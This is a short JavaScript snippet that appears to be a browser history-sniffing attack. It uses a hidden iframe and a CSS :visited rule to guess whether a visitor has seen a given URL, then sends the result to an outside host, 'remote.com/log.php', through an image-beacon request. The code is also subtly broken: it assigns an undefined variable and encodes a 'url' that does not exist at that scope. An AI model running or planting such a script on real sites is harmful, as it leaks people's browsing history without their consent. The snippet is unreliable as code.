
function hasVisited(url) {
    var result = &#34;not visited&#34;
    var iframe = document.createElement(&#39;iframe&#39;, {	width: &#39;1px&#39;, height: &#39;1px&#39;, style: &#39;visibility:hidden;&#39;});		
    document.body.appendChild(iframe);
    var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
    ifdoc.open();
    ifdoc.write(&#39;&lt;style&gt;a:visited{width:0px !important;}&lt;/style&gt;&#39;);
    ifdoc.close();
    var count = 0;
    var u = url;
    var success = false;
    var a = ifdoc.createElement(&#39;a&#39;);
    a.href = u;
    ifdoc.body.appendChild(a);
    var width = null;
    (a.currentStyle) ? width = a.currentStyle[&#39;width&#39;] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue(&#34;width&#34;);
    if (width == &#39;0px&#39;) { 
        result = visited;
    }
    document.body.removeChild(iframe);
    return result;
}

var visited = hasVisited(&#39;http://site/page&#39;);
new Image().src = &#39;http://remote.com/log.php?&#39;+encodeURI(url)+&#39;=&#39;+encodeURI(visited);


